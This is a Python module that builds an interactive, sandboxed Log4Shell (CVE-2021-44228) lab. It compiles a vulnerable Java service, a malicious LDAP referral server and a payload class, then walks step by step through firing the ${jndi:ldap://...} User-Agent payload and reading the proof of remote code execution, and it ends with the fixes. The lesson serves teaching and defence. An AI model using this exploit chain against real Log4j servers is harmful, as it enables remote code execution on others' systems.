"""Log4Shell lab (CVE-2021-44228).

A tiny Java web service that logs the User-Agent header with Log4j 2.14.1 on an
old JDK where remote JNDI class-loading still works. The reader stands up the
attacker's LDAP + HTTP servers and fires the ${jndi:...} payload themselves.
"""
import os

import modal

SLUG = "log4shell"
APP_NAME = "piy-log4shell"
SANDBOX_TIMEOUT = 900

_LAB = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", "..", "lab"))
_SRC = os.path.join(_LAB, "src")

VICTIM_CP = "/lab/build:/lab/jars/*:/lab/config"
ATTACKER_CP = "/lab/build:/lab/jars/*"


def _read(name: str) -> str:
    with open(os.path.join(_SRC, name), "r") as f:
        return f.read()


def build_image() -> modal.Image:
    return (
        modal.Image.from_registry("openjdk:8u181-jdk-stretch", add_python=None)
        .add_local_dir(os.path.join(_LAB, "jars"), "/lab/jars", copy=True)
        .add_local_dir(_SRC, "/lab/src", copy=True)
        .run_commands(
            "mkdir -p /lab/build /lab/www /lab/config",
            "cp /lab/src/log4j2.xml /lab/config/",
            "javac -cp '/lab/jars/*' -d /lab/build /lab/src/VulnerableApp.java",
            "javac -cp '/lab/jars/*' -d /lab/build /lab/src/LDAPRefServer.java /lab/src/FileServer.java",
            "javac -d /lab/www /lab/src/Exploit.java",
        )
    )


def summary() -> dict:
    return {"slug": SLUG, "title": "Log4Shell",
            "subtitle": "How one logged string turned into remote code execution on half the internet.",
            "cve": "CVE-2021-44228", "meta": "Apache Log4j 2 · disclosed December 2021 · CVSS 10.0"}


def build_lesson() -> dict:
    s = summary()
    s["blocks"] = [
            {"type": "markdown", "content": (
                "In December 2021 a single line of text — `${jndi:ldap://attacker/a}` — was enough to run "
                "arbitrary code on servers running **Apache Log4j 2**, one of the most widely used logging "
                "libraries in the Java world. Minecraft chat messages, iPhone device names, and HTTP headers "
                "all became attack vectors overnight.\n\n"
                "This page doesn't just describe it. The box on the right of each step runs against a **real, "
                "deliberately-vulnerable server** we spin up just for you in an isolated sandbox. You will send "
                "the exploit yourself and watch the victim execute your commands."
            )},
            {"type": "markdown", "content": (
                "## The sink: logging untrusted input\n\n"
                "Here is our victim. It's a tiny web service that logs the `User-Agent` header of every request. "
                "That's it — no `eval`, no deserialization, nothing that looks dangerous. Logging a string the "
                "user controls is the entire bug."
            )},
            {"type": "code", "language": "java", "title": "VulnerableApp.java",
             "content": _read("VulnerableApp.java")},
            {"type": "markdown", "content": (
                "Why is logging dangerous? Because Log4j 2 supports **message lookups**: special `${...}` tokens "
                "inside a logged string get expanded. One of those lookup types is `jndi`, which tells Log4j to "
                "go fetch an object over the network using Java's Naming and Directory Interface. Feed it "
                "`${jndi:ldap://host/x}` and the logging call itself makes an outbound LDAP request."
            )},
            {"type": "markdown", "content": (
                "## Step 1 — Start the vulnerable service\n\n"
                "First, boot the victim inside your sandbox. It listens on port 8080 and logs with Log4j 2.14.1 "
                "(the vulnerable version). We run it on an old JDK (8u181) where remote class loading over JNDI "
                "still works — exactly the kind of outdated runtime that made this so devastating in production."
            )},
            {"type": "run", "title": "Start the victim", "kind": "background",
             "logfile": "/tmp/victim.log",
             "command": f"java -Dcom.sun.jndi.ldap.object.trustURLCodebase=true -cp '{VICTIM_CP}' VulnerableApp 8080",
             "explain": "Launches the vulnerable app as a background process. Its console output streams to /tmp/victim.log."},
            {"type": "markdown", "content": (
                "## Step 2 — Confirm it works normally\n\n"
                "Send an ordinary request. Nothing unusual happens — the server logs your User-Agent and replies "
                "`200 OK`. This is the benign baseline."
            )},
            {"type": "run", "title": "Send a normal request", "kind": "foreground",
             "command": "curl -s localhost:8080 -H 'User-Agent: Mozilla/5.0'; echo; echo '--- what the victim logged ---'; tail -n 2 /tmp/victim.log",
             "explain": "A harmless request. The logged line is just your User-Agent, verbatim."},
            {"type": "markdown", "content": (
                "## The attacker's side\n\n"
                "To weaponize the JNDI lookup we stand up two servers the victim will be tricked into contacting:\n\n"
                "1. A **malicious LDAP server** that answers every query with a *reference*: \"the object you want "
                "is a Java class named `Exploit`, go download it from this URL.\"\n"
                "2. A **plain HTTP server** that hands out the compiled `Exploit.class`.\n\n"
                "Here is the LDAP server. For any lookup it returns a `javaNamingReference` pointing at our HTTP "
                "codebase."
            )},
            {"type": "code", "language": "java", "title": "LDAPRefServer.java",
             "content": _read("LDAPRefServer.java")},
            {"type": "markdown", "content": (
                "And here is the payload class. The important part is the `static {}` block: Java runs it the "
                "instant the class is loaded — before anything even tries to use the object. Loading the class "
                "*is* the code execution. Here it writes proof-of-execution to `/tmp/pwned`, but it could open a "
                "reverse shell, exfiltrate secrets, or anything else."
            )},
            {"type": "code", "language": "java", "title": "Exploit.java",
             "content": _read("Exploit.java")},
            {"type": "markdown", "content": (
                "## Step 3 — Arm the attacker\n\n"
                "Start both attacker servers inside the sandbox. (In a real attack these would run on the "
                "attacker's own machine out on the internet.)"
            )},
            {"type": "run", "title": "Start the attacker's HTTP class server", "kind": "background",
             "logfile": "/tmp/http.log",
             "command": "java -cp /lab/build FileServer /lab/www",
             "explain": "Serves the compiled Exploit.class on port 8888."},
            {"type": "run", "title": "Start the attacker's LDAP server", "kind": "background",
             "logfile": "/tmp/ldap.log",
             "command": f"java -cp '{ATTACKER_CP}' LDAPRefServer 'http://127.0.0.1:8888/' Exploit",
             "explain": "Listens on port 1389 and references Exploit at the HTTP codebase above."},
            {"type": "markdown", "content": (
                "## Step 4 — Fire the exploit\n\n"
                "Now send the same kind of request as before, but put the magic JNDI string in the User-Agent. "
                "The response still just says `200 OK` — but behind the scenes the victim is about to reach out "
                "to the attacker's LDAP server, download `Exploit.class`, and run it."
            )},
            {"type": "run", "title": "Send the malicious request", "kind": "foreground",
             "command": "curl -s localhost:8080 -H 'User-Agent: ${jndi:ldap://127.0.0.1:1389/Exploit}'",
             "explain": "The payload ${jndi:ldap://127.0.0.1:1389/Exploit} rides in the User-Agent header."},
            {"type": "markdown", "content": (
                "## Step 5 — Watch the chain fire\n\n"
                "Look at what the servers logged. The victim resolved the JNDI reference and loaded a remote "
                "class; the attacker's HTTP server shows it handed over `Exploit.class`. The `ClassCastException` "
                "you'll see is expected — and it's the smoking gun: the class was *loaded and its static block "
                "ran* (that's the RCE) before Java even got to the failed cast."
            )},
            {"type": "run", "title": "Inspect the server logs", "kind": "foreground",
             "command": "echo '===== VICTIM ====='; cat /tmp/victim.log; echo; echo '===== ATTACKER HTTP ====='; cat /tmp/http.log; echo; echo '===== ATTACKER LDAP ====='; cat /tmp/ldap.log",
             "explain": "The full trail across victim and attacker."},
            {"type": "markdown", "content": (
                "## Step 6 — Proof of remote code execution\n\n"
                "The payload ran a command *as the victim process* and dropped the result at `/tmp/pwned`. Read "
                "it. If you see `uid=0(root)`, the attacker just ran arbitrary commands on the victim via nothing "
                "but a logged HTTP header."
            )},
            {"type": "run", "title": "Read the proof", "kind": "foreground",
             "command": "cat /tmp/pwned",
             "explain": "Written by the attacker's code, executing inside the victim."},
            {"type": "markdown", "content": (
                "## Why it mattered, and the fix\n\n"
                "The JNDI lookup feature was on by default, reachable through any logged string, and present in a "
                "library embedded in countless applications. That combination is why Log4Shell scored a perfect "
                "CVSS 10.0.\n\n"
                "Fixes, in order of how they rolled out: Log4j **2.15.0** disabled remote JNDI lookups by default, "
                "**2.16.0** removed the message-lookup feature entirely, and modern JDKs already default "
                "`com.sun.jndi.ldap.object.trustURLCodebase` to `false` so the remote-class trick we used here is "
                "blocked. The durable lesson: never let untrusted input reach an interpreter you didn't know you "
                "had — even your logger."
            )},
    ]
    return s
